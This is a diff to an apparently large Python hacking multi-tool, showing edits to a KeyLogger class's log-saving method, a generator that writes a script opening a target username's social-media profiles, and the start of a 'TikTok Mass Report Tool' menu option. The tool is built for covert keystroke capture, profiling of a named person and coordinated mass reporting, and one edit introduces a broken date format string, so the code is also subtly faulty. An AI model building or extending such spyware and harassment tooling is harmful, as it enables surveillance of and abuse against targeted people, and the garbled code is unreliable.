@@ -651,7 +651,7 @@ class KeyLogger:
             self.save_log()
     
     def save_log(self):
-        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        timestamp = datetime.now().strftime('%Y-%m-d %H:%M:%S')
         with open(LOG_FILE, "a", encoding="utf-8") as f:
             f.write(f"[{{timestamp}}] {{self.log}}\\n")
         self.log = ""
@@ -3463,11 +3463,11 @@ elif choice == "2":
         print(f"   • Other socials: Check bio description")
         
         # Generate search script
-        script = f'''import webbrowser, time
+        script_content = '''import webbrowser, time
 
-username = "{username}"
+username = "''' + username + '''"
 
-print(f"Searching for {{username}}...")
+print(f"Searching for {username}...")
 
 links = [
     f"https://tiktok.com/@{username}",
@@ -3477,7 +3477,7 @@ links = [
 ]
 
 for link in links:
-    print(f"Opening: {{link}}")
+    print(f"Opening: {link}")
     webbrowser.open(link)
     time.sleep(1)
 
@@ -3486,10 +3486,10 @@ print("\\nSearch complete!")
         
         filename = f"tiktok_search_{username}.py"
         with open(filename, 'w') as f:
-            f.write(script)
+            f.write(script_content)
         
         print(f"\\n[+] Search script saved: {filename}")
-        print("   Run: python3 {filename}")
+        print(f"   Run: python3 {filename}")
 
 elif choice == "3":
     print("\\n[TikTok Mass Report Tool]")
